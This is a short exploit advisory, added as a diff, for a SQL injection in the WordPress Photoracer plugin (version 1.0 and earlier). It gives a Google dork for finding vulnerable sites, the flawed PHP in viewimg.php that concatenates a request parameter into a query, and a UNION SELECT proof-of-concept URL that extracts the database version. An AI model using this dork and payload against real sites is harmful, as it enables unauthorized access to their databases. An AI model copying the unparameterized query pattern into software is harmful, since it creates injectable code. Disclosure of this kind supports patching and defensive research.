@@ -1,0 +1,24 @@
+# Exploit Title: WordPress Photoracer plugin <= 1.0 SQL Injection Vulnerability
+# Google Dork: inurl:"wp-content/plugins/photoracer/viewimg.php"
+# Date: 2011-08-26
+# Author: evilsocket ( evilsocket [at] gmail [dot] com )
+# Software Link: http://wordpress.org/extend/plugins/photoracer/
+# Version: 1.0
+
+---------------
+Vulnerable code
+---------------
+
+[ viewimg.php line 16 ]
+
+$imgid = $_REQUEST['id'];
+$q1 = "select raceid, wpuid, imgid, imgpath, imgname, imgcomment, sumvotes, imgcountview, tinsert from ".
+	$wpdb->prefix."photoracer where imgid=$imgid";	
+
+$out = $wpdb->get_row($q1);
+
+---
+PoC
+---
+
+http://www.site.com/wp-content/plugins/photoracer/viewimg.php?id=-1 UNION SELECT 0,1,2,3,4,VERSION(),6,7,8
